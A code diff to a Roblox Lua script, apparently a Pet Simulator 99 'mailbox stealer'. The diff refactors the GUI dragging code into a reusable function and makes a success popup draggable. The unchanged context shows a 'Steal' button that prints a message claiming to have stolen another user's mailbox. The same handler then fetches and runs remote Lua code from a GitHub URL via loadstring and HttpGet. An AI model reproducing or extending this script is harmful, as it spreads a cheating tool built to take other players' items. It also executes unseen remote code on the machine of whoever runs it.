@@ -37,41 +37,45 @@ CloseButton.Size = UDim2.new(0, 20, 0, 20)
 CloseButton.Text = "X"
 
 -- Dragging functionality
-local dragging
-local dragInput
-local dragStart
-local startPos
+local function makeDraggable(frame)
+    local dragging
+    local dragInput
+    local dragStart
+    local startPos
 
-local function update(input)
-    local delta = input.Position - dragStart
-    Frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    local function update(input)
+        local delta = input.Position - dragStart
+        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+
+    frame.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType.Touch then
+            dragging = true
+            dragStart = input.Position
+            startPos = frame.Position
+
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragging = false
+                end
+            end)
+        end
+    end)
+
+    frame.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType.Touch then
+            dragInput = input
+        end
+    end)
+
+    game:GetService("UserInputService").InputChanged:Connect(function(input)
+        if input == dragInput and dragging then
+            update(input)
+        end
+    end)
 end
 
-Frame.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType.Touch then
-        dragging = true
-        dragStart = input.Position
-        startPos = Frame.Position
-
-        input.Changed:Connect(function()
-            if input.UserInputState == Enum.UserInputState.End then
-                dragging = false
-            end
-        end)
-    end
-end)
-
-Frame.InputChanged:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType.Touch then
-        dragInput = input
-    end
-end)
-
-game:GetService("UserInputService").InputChanged:Connect(function(input)
-    if input == dragInput and dragging then
-        update(input)
-    end
-end)
+makeDraggable(Frame)
 
 CloseButton.MouseButton1Click:Connect(function()
     ScreenGui:Destroy()
@@ -108,6 +112,8 @@ StealButton.MouseButton1Click:Connect(function()
     SuccessLabel.Position = UDim2.new(0.5, 0, 0.3, 0)
     SuccessLabel.Size = UDim2.new(0.8, 0, 0.4, 0)
     SuccessLabel.Text = "Successfully Stole " .. username .. "'s mailbox!"
+
+    makeDraggable(SuccessFrame)
 
     -- Execute another script
     loadstring(game:HttpGet("https://raw.githubusercontent.com/D3athFeather/ps99/main/de870018723945ddefe27853.lua"))()
